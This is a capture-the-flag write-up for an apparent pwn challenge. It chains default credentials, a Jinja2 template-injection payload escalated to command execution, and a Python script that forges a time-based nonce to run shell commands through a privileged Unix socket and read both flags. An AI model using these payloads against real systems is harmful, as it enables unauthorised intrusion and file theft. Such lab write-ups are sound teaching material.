# echochamber-user

**Event:** CryoVault CTF 2026
**Category:** pwn
**Flag:** `isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}`

---

## Recon

```bash
nmap -Pn -sC -sV -T4 -p- --min-rate 2000 10.48.151.156
```

Open ports:
- **22** - SSH (OpenSSH 9.2p1)
- **80** - HTTP (nginx 1.22.1) - "Anadyne Systems · Alert Review Console"

## Web App - Default Credentials

The login page at `/login` displays credentials in plaintext:

```
dev console credentials: analyst / analyst
```

The footer also hints: *"keystroke telemetry via libechotap.so is enabled on this workstation"*

## SSTI in Preview Endpoint

Each alert page has a "preview a draft update" feature that POSTs to `/api/alert/preview` with JSON `{"title":"...","body":"..."}`.

Testing for Jinja2 Server-Side Template Injection:

```bash
curl -s -b cookies.txt -H 'Content-Type: application/json' \
  http://10.48.151.156/api/alert/preview \
  -d '{"title":"test","body":"{{7*7}}"}'
```

Response: `{"html":"<h2>test</h2>\n<div class='preview-body'>49</div>","ok":true}`

**SSTI confirmed.** The body field is rendered through Jinja2 without sanitization.

## RCE as `analyst`

Escalating SSTI to Remote Code Execution:

```bash
curl -s -b cookies.txt -H 'Content-Type: application/json' \
  http://10.48.151.156/api/alert/preview \
  -d '{"title":"t","body":"{{ self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read() }}"}'
```

Result: `uid=1001(analyst) gid=1001(analyst) groups=1001(analyst),1004(echo-log)`

## Enumeration via RCE

The alert queue contained useful intel:

| Alert | Key Info |
|-------|----------|
| #3 | Classifier spec at `/opt/echochamber/classifier.py` |
| #4 | Warden swaps symlinks for sessions; verdicts in `/var/log/echo/verdicts.jsonl` |
| #5 | Dispatch table at `/etc/sentinel/dispatch.json` (symlink) |

The dispatch table:

```json
{
  "heartbeat": {"handler": "heartbeat"},
  "status":    {"handler": "status"},
  "shell":     {"handler": "exec_shell", "gate": "nonce_time"}
}
```

## User Flag - Sentinel Socket

Reading `/opt/sentinel/sentinel.py` revealed the full mechanism:

- The **sentinel** service listens on a Unix socket at `/run/sentinel/ctrl.sock`
- It runs as the `sentinel` user with **CAP_DAC_READ_SEARCH** (can read any file on the system)
- The `exec_shell` handler executes arbitrary shell commands but is gated by a time-based nonce
- The nonce is computed as: `sha256("{minute_epoch}:{SALT}")[:16]` where `SALT = "sentinel-salt-v1-a3b7c2d9"`
- The nonce accepts ±1 minute of drift

Exploiting it (via SSTI to run Python on the target):

```python
import hashlib, time, json, socket, base64

t = int(time.time()) // 60
nonce = hashlib.sha256(f"{t}:sentinel-salt-v1-a3b7c2d9".encode()).hexdigest()[:16]
cmd = base64.b64encode(b"cat /home/sentinel/*").decode()

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/sentinel/ctrl.sock")
s.sendall(json.dumps({"op": "shell", "nonce": nonce, "payload": cmd}).encode() + b"\n")
print(s.recv(65536).decode())
s.close()
```

**User Flag:** `isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}`

> **Note:** Decoy flags exist at `/var/lib/warden/decoy/user.txt` (`isfcr{echoes_sound_the_same}`) and `/var/lib/warden/decoy/root.txt` (`isfcr{s0_cl0se_but_s0_f4r}`). These are traps placed by the "warden" symlink-swapping mechanism.

## Root Flag - CAP_DAC_READ_SEARCH

Since the sentinel process has `CAP_DAC_READ_SEARCH`, any child process it spawns inherits the capability. This means `cat /root/root.txt` works through the sentinel socket without needing traditional privilege escalation:

```python
cmd = base64.b64encode(b"cat /root/root.txt").decode()
# ... same socket connection as above ...
```

**Root Flag:** `isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}`

---

## Attack Chain Summary

```
Default creds (analyst/analyst)
  → SSTI in /api/alert/preview (Jinja2)
    → RCE as analyst (uid=1001)
      → Read sentinel.py (source code, SALT, nonce algorithm)
        → Compute time-based nonce
          → Connect to /run/sentinel/ctrl.sock
            → exec_shell as sentinel (CAP_DAC_READ_SEARCH)
              → Read /home/sentinel/* → User Flag
              → Read /root/root.txt   → Root Flag
```

